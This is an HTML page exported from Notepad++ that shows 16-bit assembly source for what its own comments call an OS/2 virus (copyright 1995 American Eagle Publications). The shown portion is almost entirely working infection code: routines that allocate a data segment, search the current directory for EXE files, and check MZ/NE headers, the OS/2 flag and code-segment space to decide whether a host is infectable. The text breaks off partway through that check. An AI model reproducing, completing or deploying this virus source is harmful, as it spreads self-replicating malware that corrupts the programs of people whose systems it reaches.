<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;This is a basic OS/2 virus which infects other OS/2 EXEs in the same</span><span class="sc0">
</span><span class="sc1">;directory</span><span class="sc0">

</span><span class="sc1">;(C) 1995 American Eagle Publications, Inc. All rights reserved.</span><span class="sc0">

        </span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc1">;Useful constants</span><span class="sc0">
</span><span class="sc5">DATABUF_SIZE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4096</span><span class="sc0">                            </span><span class="sc1">;size of read/write buf</span><span class="sc0">
</span><span class="sc5">NEW_HDR_SIZE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40H</span><span class="sc0">                             </span><span class="sc1">;size of new EXE header</span><span class="sc0">
</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">END_VIRUS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc1">;size of virus</span><span class="sc0">

        </span><span class="sc9">EXTRN</span><span class="sc0">   </span><span class="sc5">DosExit</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosChgFilePtr</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosFindFirst</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc9">EXTRN</span><span class="sc0">   </span><span class="sc5">DosFindNext</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosAllocSeg</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosFreeSeg</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc9">EXTRN</span><span class="sc0">   </span><span class="sc5">DosOpen</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosRead</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosWrite</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosClose</span><span class="sc4">:</span><span class="sc10">FAR</span><span class="sc0">

</span><span class="sc5">DGROUP</span><span class="sc0">  </span><span class="sc9">GROUP</span><span class="sc0">   </span><span class="sc5">_DATA</span><span class="sc4">,</span><span class="sc5">_STACK</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">USE16</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">_DATA</span><span class="sc0">

        </span><span class="sc9">PUBLIC</span><span class="sc0">  </span><span class="sc5">VIRUS</span><span class="sc0">

</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This is the main virus routine. It simply finds a file to infect and infects</span><span class="sc0">
</span><span class="sc1">;it, and then passes control to the host program. It resides in the first</span><span class="sc0">
</span><span class="sc1">;segment of the host program, that is, the segment where control is initially</span><span class="sc0">
</span><span class="sc1">;passed.</span><span class="sc0">

</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">    </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                         </span><span class="sc1">;save all registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CREATE_DS</span><span class="sc0">               </span><span class="sc1">;create the data segment</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VIR_START</span><span class="sc0">               </span><span class="sc1">;find starting offset of virus</span><span class="sc0">
</span><span class="sc5">VIR_START</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIR_START</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">VSTART</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INIT_DS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FIND_FILE</span><span class="sc0">               </span><span class="sc1">;find a viable file to infect</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">GOTO_HOST</span><span class="sc0">         </span><span class="sc1">;z set if a file was found</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT_FILE</span><span class="sc0">             </span><span class="sc1">;infect it if found</span><span class="sc0">
</span><span class="sc5">GOTO_HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DESTROY_DS</span><span class="sc0">              </span><span class="sc1">;clean up memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">VIRUS_DONE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">                    </span><span class="sc1">;pass control to host program</span><span class="sc0">

</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'(C) 1995 American Eagle Publications Inc., All rights reserved.'</span><span class="sc0">

</span><span class="sc1">;This routine creates a data segment for the virus. To do that, it</span><span class="sc0">
</span><span class="sc1">;(1) allocates memory for the virus (2) creates a data segment for that memory</span><span class="sc0">
</span><span class="sc1">;(3) sets up ds and es with this new selector, and (4) saves the handle for</span><span class="sc0">
</span><span class="sc1">;the memory so it can be freed when done.</span><span class="sc0">
</span><span class="sc5">CREATE_DS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DATASTART</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DATAEND</span><span class="sc0">        </span><span class="sc1">;push size of memory to alloc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">;push @ of pointer to memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;page write</span><span class="sc0">
</span><span class="sc5">DALSE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosAllocSeg</span><span class="sc0">             </span><span class="sc1">;go allocate memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;ds:bx points to memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;restore stack</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;EXIT FOR NOW</span><span class="sc0">

</span><span class="sc5">CFILE_ID1</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CFILE_ID2</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CKNAME</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'DOSCALLS'</span><span class="sc0">

</span><span class="sc1">;Initialize data in data segment.</span><span class="sc0">
</span><span class="sc5">INIT_DS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DHANDLE</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SRCHCOUNT</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">CFILE_ID1</span><span class="sc0">             </span><span class="sc1">;move constant strings to ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">VSTART</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FILE_ID1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INIT_DS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">CFILE_ID1</span><span class="sc0">
</span><span class="sc5">CDL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CDL</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;all done</span><span class="sc0">

</span><span class="sc1">;This routine frees the memory allocated by CREATE_DS.</span><span class="sc0">
</span><span class="sc5">DESTROY_DS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">DFRSE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosFreeSeg</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This routine searches for a file to infect. It looks for EXE files and then</span><span class="sc0">
</span><span class="sc1">;checks them to see if they're uninfected, infectable Windows files. If a file</span><span class="sc0">
</span><span class="sc1">;is found, this routine returns with Z set, with the file left open, and its</span><span class="sc0">
</span><span class="sc1">;handle in the bx register. This FIND_FILE searches only the current directory.</span><span class="sc0">

</span><span class="sc5">FIND_FILE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;push address of file identifier</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FILE_ID1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;push address of handle for search</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DHANDLE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">07h</span><span class="sc0">                     </span><span class="sc1">;attribute</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">;push address of buffer used for search</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SBUF</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">SBUF</span><span class="sc0">               </span><span class="sc1">;size of buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;push address of search count variable</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SRCHCOUNT</span><span class="sc0">        </span><span class="sc1">;       filled in by DosFind</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;reserved dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FFIRST</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosFindFirst</span><span class="sc0">            </span><span class="sc1">;Find first file</span><span class="sc0">
</span><span class="sc5">FIND_LOOP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;error?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FIND_EXIT</span><span class="sc0">               </span><span class="sc1">;yes, exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SRCHCOUNT</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;no files found?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FIND_EXITNZ</span><span class="sc0">             </span><span class="sc1">;none found</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_OK</span><span class="sc0">                 </span><span class="sc1">;ok to infect?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FIND_EXIT</span><span class="sc0">               </span><span class="sc1">;yes, get out with Z set</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">DHANDLE</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;push handle for search</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;push address of search structure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SBUF</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">SBUF</span><span class="sc0">               </span><span class="sc1">;and length of buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;and push addr of SRCHCOUNT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SRCHCOUNT</span><span class="sc0">
</span><span class="sc5">FNEXT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosFindNext</span><span class="sc0">             </span><span class="sc1">;do it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FIND_LOOP</span><span class="sc0">

</span><span class="sc5">FIND_EXITNZ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">FIND_EXIT</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;pass control back to main routine</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;This routine determines whether a file is ok to infect. The conditions for an</span><span class="sc0">
</span><span class="sc1">;OK file are as follows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       (1) It must be an OS/2 EXE file.</span><span class="sc0">
</span><span class="sc1">;       (2) There must be enough room in the initial code segment for it.</span><span class="sc0">
</span><span class="sc1">;       (3) The file must not be infected already.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;If the file is OK, this routine returns with Z set, the file open, and the</span><span class="sc0">
</span><span class="sc1">;handle in bx. If the file is not OK, this routine returns with NZ set, and</span><span class="sc0">
</span><span class="sc1">;it closes the file. This routine also sets up a number of important variables</span><span class="sc0">
</span><span class="sc1">;as it snoops through the file. These are used by the infect routine later.</span><span class="sc0">
</span><span class="sc5">FILE_OK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SBUF</span><span class="sc4">+</span><span class="sc2">23</span><span class="sc0">       </span><span class="sc1">;dx points to file to infect's name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_OPEN</span><span class="sc0">               </span><span class="sc1">;open the file</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FOK_ERROR2</span><span class="sc0">              </span><span class="sc1">;an error-exit appropriately</span><span class="sc0">
</span><span class="sc5">FOK1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_HDR</span><span class="sc0">       </span><span class="sc1">;ds:dx points to header buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;read 40H bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">               </span><span class="sc1">;ok, read EXE header</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FOK_ERROR1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">],</span><span class="sc2">5A4DH</span><span class="sc1">;see if first 2 bytes are 'MZ'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">FN1</span><span class="sc0">               </span><span class="sc1">;nope, file not an EXE, exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">18H</span><span class="sc4">],</span><span class="sc2">40H</span><span class="sc0">    </span><span class="sc1">;see if rel tbl at 40H or more</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">FN1</span><span class="sc0">               </span><span class="sc1">;nope, it can't be an OS/2 EXE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">3CH</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;ok, put offset to new header in dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">NH_OFFSET</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">;and save it here</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;now do a seek from start to new hdr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NEW_HDR_SIZE</span><span class="sc0">         </span><span class="sc1">;now read the new header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_HDR</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">],</span><span class="sc2">454EH</span><span class="sc0">      </span><span class="sc1">;see if this is 'NE' new header ID</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">FN1</span><span class="sc0">               </span><span class="sc1">;nope, not a Windows EXE!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">36H</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get target OS flags</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;see if target OS = OS/2</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">FOK2</span><span class="sc0">              </span><span class="sc1">;ok, go on</span><span class="sc0">
</span><span class="sc5">FN1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FOK_ERROR1</span><span class="sc0">              </span><span class="sc1">;else exit</span><span class="sc0">

</span><span class="sc1">;If we get here, then condition (1) is fulfilled.</span><span class="sc0">

</span><span class="sc5">FOK2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get initial cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_SEG_ENTRY</span><span class="sc0">           </span><span class="sc1">;and read seg table entry into disk buf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;put segment length in ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">           </span><span class="sc1">;add size of virus to it</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">FOK_ERROR1</span><span class="sc0">        </span><span class="sc1">;if we carry, there's not enough room</span><span class="sc0">
                                        </span><span class="sc1">;else we're clear on this count</span><span class="sc0">

</span><span class="sc1">;If we get here, then condition (2) is fulfilled.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">32H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;logical sector alignment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;ax=logical sector size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get logical-sector offset of start seg</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;byte offset in dx:ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;add in ip of entry point</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;put entry point in cx:dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;and seek from start of file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">                  </span><span class="sc1">;read 32 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">          </span><span class="sc1">;into buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">
